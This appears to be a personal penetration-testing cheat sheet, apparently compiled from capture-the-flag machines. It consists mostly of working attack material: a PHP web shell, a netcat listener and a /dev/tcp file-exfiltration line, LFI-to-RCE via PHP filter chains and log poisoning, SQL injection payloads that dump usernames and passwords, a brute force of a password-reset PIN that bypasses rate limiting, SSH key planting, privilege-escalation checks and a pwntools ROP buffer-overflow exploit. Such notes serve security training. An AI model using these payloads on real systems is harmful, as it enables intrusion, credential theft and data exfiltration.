```shell
if uploaded a zip we can rce via that:
shell.php: <?php system($_REQUEST['cmd']); ?>

upload/xyz.cip/shell //no php
and inside the get or psost request do the cmd as data so cmd=<reverse_shell_payload>
%
edit the sessions if stored locally

```

```shell

// cobalt ssti search for ssti:
${{<%[%'"}}%\.'"

%0a to test for injection as a newline character

<b>test</b>
;whoami
```

```shell
ls -la /opt
ls -la /var


/etc/apache2/sites-enabled/<domain_name>.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/sites-enabled/default
/etc/nginx/sites-enabled/<subdomain/domain>

/proc/self/environ
/proc/self/cmdline
/proc/{1-1000}/cmdline

sudo -l
netstat -ntlpu

grep -R <port_number> /etc 2>/dev/null
```

```shell
nc -lvnp 4444
cat <filename> > /dev/tcp/<ip>/<port>
```

```shell
//set  index.html as a bash vofr on python3 -m http.server to execute that
```

```shell
ssh keygen -f victor
//then put victor.pub as authorized_keys in the .ssh folder, then chmod 600 and we can ssh in
ssh -i victor victor@<target>
```

```shell
// Use snyk vs code extension for static vulnerability analysis of code
```

```shell

?page=php://filter/convert.base64-encode/resource=index

// paste the output where the filter is above
python3 php_filter_chain_generator.py --chain '<?php system($_REQUEST["cmd"]); ?>'
// &cmd=<url_encoded_payload>

// as a get request
User-Agent: <?php system($_GET['cmd']); ?>

// as a get or post request
?page=....//....//....//....//var/log/nginx/access.log?cmd=id

```

```shell
// Rate-Limiting bypass:

X-Forwarder-For: 127.0.0.3

wfuzz -H 'Cookie: XSRF-TOKEN=eyJpdI...[long string]...In0%3D; laravel_session=eyJpdI...[long string]...In0%3D' -H 'Content-Type: application/x-www-form-urlencoded' -u http://10.10.11.159/api/resettoken -d 'name=admin&pin=FUZZ' -z range,1000-9999 -m zip -w numbers -H 'X-Forwarded-For: 127.0.0.FUZZ' --hh 564

ffuf -w pins.txt:PIN -w ips.txt:IP \
     -mode pitchfork \
     -u http://10.10.11.159/api/resettoken \
     -X POST \
     -H 'Cookie: ...[your full cookie string]...' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'X-Forwarded-For: 127.0.0.IP' \
     -d 'name=admin&pin=PIN' \
     -fc 564


```

```shell
//tamper with cookies, also type convert like cookie to true via application/json or change a char in the cookie etc
```

```shell
// Find wriatable and owned by us and our group

find / -user $USER 2>/dev/null
find / -group $GROUPNAME 2>/dev/null
find / -perm -u=w -perm -g=w
find / -perm -u=s -type f 2>/dev/null | xargs ls -la


getfacl <filename>
lsattr <filename>

// running file with ltrace or gdb
```
```shell
// Process brute-forcing via lfi

for i in $(seq 1 50000); do

    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi

done


for i in {1..1000}; do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"$i"/cmdline --output -; echo; done > PIDs.txt
awk -F / '{print $9, $10, $11, $12, $13, $14, $15}' PIDs.txt | sed 's/cmdline//' | sed 's|<script>window.close()< script>||g' > PIDS_filtered.txt
```

```shell
grep -r TTY
grep  -rnIE -e "passwd" .
```

```shell
cewl -m 4 | sort -u > passwords.txt
```

```shell
// if python script set PYTHONPATH to other for library:
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh


```

```shell
sudo mysql -u root -p -e "
    -- Create the new database
    CREATE DATABASE pwn;
    USE pwn;

    -- Create the sink table for the exploit
    CREATE TABLE content (
        text_content TEXT
    );

    -- Create the remote user (if not already done)
    CREATE USER 'remote_user'@'%' IDENTIFIED BY 'strong_password';

    -- Grant permissions on the new database to the remote user
    GRANT ALL PRIVILEGES ON pwn.* TO 'remote_user'@'%' WITH GRANT OPTION;
    
    -- Ensure all privileges are applied
    FLUSH PRIVILEGES;
"

# 3. Modify the MariaDB configuration file to listen on all interfaces (0.0.0.0)
# Note: This opens the nano editor; you must manually find and change bind-address = 127.0.0.1 to bind-address = 0.0.0.0
sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf 

# 4. Restart the MariaDB service to apply the bind-address change
sudo systemctl restart mariadb

# 5. Open port 3306 on the host firewall (UFW)
sudo ufw allow 3306/tcp
sudo ufw reload

# 6. Optional: Final restart (as included in your history)
sudo systemctl restart mariadb
```

```shell
// Setting up gef with gdb

git clone https://github.com/hugsy/gef.git
echo source `pwd`/gef/gef.py >> ~/.gdbinit

pattern create 200
run
pattern search $rsp

python -c 'print("A"*120 + "B"*8+"C"*8)'
registers

info functions
disassemble main


////
#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64")

binsh = b"/bin/sh\x00"                       # bytes
junk = b"A" * (120 - len(binsh))             # bytes

plt_system = p64(0x401040)                   # bytes
test = p64(0x401152)
pop_r13_r14_r15 = p64(0x401206)

# all parts are now bytes, so this is fine
payload = junk + binsh + pop_r13_r14_r15 + plt_system + p64(0) + p64(0) + test

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.interactive()
```

```shell
%09 or ${IFS} instead of space in rce
`whoami`
```

```shell
?user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `?` FROM users)y;-- -&sort=?

?user_id=1` FROM (SELECT 1 AS `leak`)x;-- -&sort=leak

?user_id=1` FROM (SELECT group_concat(username,0x3a,password) AS `?`)x;-- -&sort=?
```

```shell
// path traversal giving 400

/..;/manager/
;name=PleaseSubscribe/manager/
```

```shell
// use parameter in the url or in the request body

/api/v1/user?token=0&id=FUZZ
```
